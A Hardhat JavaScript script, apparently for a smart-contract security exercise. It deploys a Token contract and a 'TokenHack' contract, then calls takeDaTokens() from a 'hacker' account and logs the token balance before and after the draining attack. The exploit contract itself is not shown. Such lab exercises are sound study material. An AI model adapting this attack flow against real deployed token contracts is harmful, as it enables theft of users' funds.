const { ethers } = require("hardhat");

async function main() {

    let deployer, hacker_account
    // step one step contract to deploy
    const account = await ethers.getSigners()
  
    deployer = account[0]
    hacker_account = account[1]

    const token_contract = await ethers.getContractFactory("contracts/Token.sol:Token", deployer);
    const tokenH_contract = await ethers.getContractFactory("TokenHack", hacker_account);

    
    const token_deploy = await token_contract.deploy(2100000)

    console.log("Token Address")
    console.log(token_deploy.address)

    console.log("Step 1")
    const tokenH_deploy = await tokenH_contract.deploy(token_deploy.address)
    console.log("Step 2")

    token_trans = await token_deploy.connect(deployer).transfer(hacker_account.address, 20);

    console.log("Hacker Account Balance Before");
    console.log(await token_deploy.connect(deployer).balanceOf(hacker_account.address));
    
    console.log("Next");
    tokenH_trans = await tokenH_deploy.connect(hacker_account).takeDaTokens({gasLimit: 3000000});
    
    console.log("Hacker Account Balance After");
    console.log(await token_deploy.connect(deployer).balanceOf(hacker_account.address));


}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});

